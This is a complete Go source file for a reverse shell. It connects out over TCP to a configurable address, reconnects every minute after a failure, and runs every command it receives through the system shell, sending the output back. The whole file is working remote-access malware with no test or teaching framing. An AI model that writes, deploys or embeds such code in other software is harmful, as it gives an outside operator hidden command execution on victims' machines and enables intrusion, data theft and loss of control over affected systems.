package main

import (
	"bufio"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"

	"./shell"
)

var (
	Addr            = ""
	shellPath       = ""
	defaultArgument = ""
	curDir          = ""
	defaultDir      = ""
)

func main() {
	defaultDir, _ = os.UserHomeDir()
	curDir = defaultDir
	shellPath, defaultArgument = shell.GetSystemShell()
	reverse(Addr)
}

func reverse(host string) {
	c, err := net.Dial("tcp", host)
	if err != nil {
		if c != nil {
			c.Close()
		}
		time.Sleep(time.Minute)
		reverse(host)
	}

	r := bufio.NewReader(c)

	for {
		c.Write([]byte("\n" + curDir + "> "))
		runCommand, err := r.ReadString('\n')
		if err != nil {
			c.Close()
			reverse(host)
			return
		}
		if strings.HasPrefix(runCommand, "cd ") {
			curDir = strings.TrimSpace(strings.Replace(runCommand, "cd ", "", 1))
			if strings.Contains(curDir, "~") {
				curDir = strings.Replace(curDir, "~", defaultDir, 1)
			}
			continue
		}
		cmd := exec.Command(shellPath, defaultArgument, runCommand)
		cmd.Dir = curDir
		out, err := cmd.CombinedOutput()
		if err != nil {
			c.Write([]byte(err.Error()))
		}

		c.Write(out)
	}
}
